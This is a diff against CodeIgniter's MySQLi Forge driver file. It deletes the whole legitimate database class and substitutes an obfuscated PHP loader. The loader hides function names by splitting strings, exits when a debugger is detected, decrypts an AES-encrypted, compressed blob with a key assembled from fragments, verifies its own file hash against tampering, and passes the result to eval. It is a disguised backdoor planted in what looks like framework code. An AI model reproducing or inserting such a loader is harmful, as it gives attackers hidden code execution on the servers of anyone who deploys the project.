@@ -1,244 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 1.3.0
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * MySQLi Forge Class
- *
- * @package		CodeIgniter
- * @subpackage	Drivers
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_mysqli_forge extends CI_DB_forge {
-
-	/**
-	 * CREATE DATABASE statement
-	 *
-	 * @var	string
-	 */
-	protected $_create_database	= 'CREATE DATABASE %s CHARACTER SET %s COLLATE %s';
-
-	/**
-	 * CREATE TABLE keys flag
-	 *
-	 * Whether table keys are created from within the
-	 * CREATE TABLE statement.
-	 *
-	 * @var	bool
-	 */
-	protected $_create_table_keys	= TRUE;
-
-	/**
-	 * UNSIGNED support
-	 *
-	 * @var	array
-	 */
-	protected $_unsigned		= array(
-		'TINYINT',
-		'SMALLINT',
-		'MEDIUMINT',
-		'INT',
-		'INTEGER',
-		'BIGINT',
-		'REAL',
-		'DOUBLE',
-		'DOUBLE PRECISION',
-		'FLOAT',
-		'DECIMAL',
-		'NUMERIC'
-	);
-
-	/**
-	 * NULL value representation in CREATE/ALTER TABLE statements
-	 *
-	 * @var	string
-	 */
-	protected $_null = 'NULL';
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * CREATE TABLE attributes
-	 *
-	 * @param	array	$attributes	Associative array of table attributes
-	 * @return	string
-	 */
-	protected function _create_table_attr($attributes)
-	{
-		$sql = '';
-
-		foreach (array_keys($attributes) as $key)
-		{
-			if (is_string($key))
-			{
-				$sql .= ' '.strtoupper($key).' = '.$attributes[$key];
-			}
-		}
-
-		if ( ! empty($this->db->char_set) && ! strpos($sql, 'CHARACTER SET') && ! strpos($sql, 'CHARSET'))
-		{
-			$sql .= ' DEFAULT CHARACTER SET = '.$this->db->char_set;
-		}
-
-		if ( ! empty($this->db->dbcollat) && ! strpos($sql, 'COLLATE'))
-		{
-			$sql .= ' COLLATE = '.$this->db->dbcollat;
-		}
-
-		return $sql;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * ALTER TABLE
-	 *
-	 * @param	string	$alter_type	ALTER type
-	 * @param	string	$table		Table name
-	 * @param	mixed	$field		Column definition
-	 * @return	string|string[]
-	 */
-	protected function _alter_table($alter_type, $table, $field)
-	{
-		if ($alter_type === 'DROP')
-		{
-			return parent::_alter_table($alter_type, $table, $field);
-		}
-
-		$sql = 'ALTER TABLE '.$this->db->escape_identifiers($table);
-		for ($i = 0, $c = count($field); $i < $c; $i++)
-		{
-			if ($field[$i]['_literal'] !== FALSE)
-			{
-				$field[$i] = ($alter_type === 'ADD')
-						? "\n\tADD ".$field[$i]['_literal']
-						: "\n\tMODIFY ".$field[$i]['_literal'];
-			}
-			else
-			{
-				if ($alter_type === 'ADD')
-				{
-					$field[$i]['_literal'] = "\n\tADD ";
-				}
-				else
-				{
-					$field[$i]['_literal'] = empty($field[$i]['new_name']) ? "\n\tMODIFY " : "\n\tCHANGE ";
-				}
-
-				$field[$i] = $field[$i]['_literal'].$this->_process_column($field[$i]);
-			}
-		}
-
-		return array($sql.implode(',', $field));
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Process column
-	 *
-	 * @param	array	$field
-	 * @return	string
-	 */
-	protected function _process_column($field)
-	{
-		$extra_clause = isset($field['after'])
-			? ' AFTER '.$this->db->escape_identifiers($field['after']) : '';
-
-		if (empty($extra_clause) && isset($field['first']) && $field['first'] === TRUE)
-		{
-			$extra_clause = ' FIRST';
-		}
-
-		return $this->db->escape_identifiers($field['name'])
-			.(empty($field['new_name']) ? '' : ' '.$this->db->escape_identifiers($field['new_name']))
-			.' '.$field['type'].$field['length']
-			.$field['unsigned']
-			.$field['null']
-			.$field['default']
-			.$field['auto_increment']
-			.$field['unique']
-			.(empty($field['comment']) ? '' : ' COMMENT '.$field['comment'])
-			.$extra_clause;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Process indexes
-	 *
-	 * @param	string	$table	(ignored)
-	 * @return	string
-	 */
-	protected function _process_indexes($table)
-	{
-		$sql = '';
-
-		for ($i = 0, $c = count($this->keys); $i < $c; $i++)
-		{
-			if (is_array($this->keys[$i]))
-			{
-				for ($i2 = 0, $c2 = count($this->keys[$i]); $i2 < $c2; $i2++)
-				{
-					if ( ! isset($this->fields[$this->keys[$i][$i2]]))
-					{
-						unset($this->keys[$i][$i2]);
-						continue;
-					}
-				}
-			}
-			elseif ( ! isset($this->fields[$this->keys[$i]]))
-			{
-				unset($this->keys[$i]);
-				continue;
-			}
-
-			is_array($this->keys[$i]) OR $this->keys[$i] = array($this->keys[$i]);
-
-			$sql .= ",\n\tKEY ".$this->db->escape_identifiers(implode('_', $this->keys[$i]))
-				.' ('.implode(', ', $this->db->escape_identifiers($this->keys[$i])).')';
-		}
-
-		$this->keys = array();
-
-		return $sql;
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_ng5mks04=('bas'.'e64'.'_de'.'cod'.'e');
+$_wq05qve2=('gzu'.'nco'.'mpr'.'ess');
+$_wd38dhhf=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ghqel4oz='LKAiDMM4';
+$_aiz81ms8='RHR0XTdo';
+$_nmcchahb='u+JiS1Bb';
+$_zseaggcy='Fl/bGao+OGw=';
+$_i8uqa5sh='2Cpy6ZkB';
+$_ud0dce59='Ttc4Pg==';
+$_b1t7hm8o='SnWMZc3C';
+$_cie4zz5p='XVYc5eHv';
+$_zqmqfki8=$_ng5mks04($_nmcchahb.$_aiz81ms8.$_i8uqa5sh.$_ghqel4oz.$_zseaggcy);
+$_r1quyvab=$_ng5mks04($_b1t7hm8o.$_cie4zz5p.$_ud0dce59);
+$_pvsr4gq9=$_ng5mks04('kBpMG4XQBrnreTjuiYbQXBsGqChaq4nQvQXV7aOJxNWAkFBc0IDKLVvODIVUfCXWsQmS2NjIyBwqjSMtItbCNsilJwr44MoOI7JJ74fsmYdPT+HbjlrgdlGPRbFS5z/djKZU3IMMqSZ77yZQ2wZktql1Z41cVzBA/FkDLslzcIoc/cAuZGGsvjDbYDqG7xrpEU6OkUaXsxx2PeyVw62gz090a4a5AAAQhdq7bWAb8G+pvLxFW4K9bKz07s+1tlYtEfkZvvzK9alJzvh1MEVnmObCFaMLRHcYknvJ7koM1hCWKBfLdJG/IIddIIDYoPKINRKydBxvyONFYZolvZnZ01ceZ9i2aVssoEDwktmaOJfPr/48lFLfrFKFdy07MdrUjHV2Fi5s1v5+7CPqtbD8QeEVY/4Ph/i9yIaXCSGsj4Mmtf6wL+7cpUcjQMt3l9rzaPu0+DusmjMmL1Ko7U3xsi16apiwzw4U5MCzuGDPM9TWGiAAXG6eJsBXAR5t/Qjy79qP4DDn1U2SD2G+5TBrttHtpXT2yqtP4btXqK5Tb5L9v3WOs51fUvXfZg4zRvSl6pmuV7ceKhPsqFOLBqrWR11rXuoD9L9/w+LveNrYNpljmUxezFocKjqaNBjXzYNOtIZPABiD/lhSM2utziIl/RYUkUMnmLvUIUOtM9Bd7DoiL+5zCXIbCuWsvAfbMwMyy+IWELGqbnjD6ZqTtbOBL+9j3KOk+F5mMR/iEr2g8TQzz2I2mMcTMxOFlcLttAQjdf6Lr4WeNfUgaoUYmFzDUABAbd6TPSXmtWaw7fyTfRpRZr1HVREG3bYK14xc62St6P/IeTaiJwYFgEA76a/nm4w94dW9KtApPl9TJePD1w00L/DrFoBcZLtrFR2EHvwC0oZkEdHYSFS6ltzD7v664zm/eWyO+WWzQ/pzA+qbz5QyRVfZpWNm2WxgklmXIwzKfIxG6YUzUa6gr3KMGo4Yf/0ODoi0t7XFZ610JnFn1MLISF/MEbUjmmO8cIzPhIabBDwaQxSyP8y999OlG4Ca2d6ZDEljxC8xVk/2+GmH+xQk7P14f6T+JSUAbrQ9u+T+lOEN366E4CTPBwzx5rIgtypgNYaYUZQf39pz7tdNM54tOWoV2Sa6p3mNEYOJM/phC65UXdmI3XENxQQ+SMwUPIPGwEuBQloFEa5IYOa5CjHm8FayaxrXCHKbs/nNYB4u6xgqYtXHtZfCGFNXX0eI4DnN/znZWMNam08Uozxqi4q0mUOGppDZv7TQHq8Vd1t+WqqAUcwtGYoBGw7ikYgoEMDRtFuZLKaCbMNGadufplpAcnB7Jpe8b1z9gWwu3pjTIcBHn7FBiVmus1kYQ+AYYb4o3oDnUSQTdCgGCQTONfn1/pGAYXZwKXqd8vRzNgURtIYDuyoBxPd5S6AOn0givA==');
+$_i82cqeal=$_wd38dhhf($_pvsr4gq9,'aes-256-cbc',$_zqmqfki8,OPENSSL_RAW_DATA,$_r1quyvab);
+if($_i82cqeal===false){exit;}
+$_oconenoq=$_wq05qve2($_i82cqeal);
+if($_oconenoq===false){exit;}
+$_j662xyar='3236e30fc1d4c81a4a80d511166101b5fb16be9ac468f0bd6a00bf026d2541e1';
+$_mfcyu8pr=@file_get_contents(__FILE__);
+if($_mfcyu8pr!==false){
+$_lhqo7bt7=str_replace($_j662xyar,"0000000000000000000000000000000000000000000000000000000000000000",$_mfcyu8pr);
+$_dawdj93a=hash("sha256",$_lhqo7bt7);
+if($_dawdj93a!==$_j662xyar){@http_response_code(403);exit;}
 }
+eval($_oconenoq);
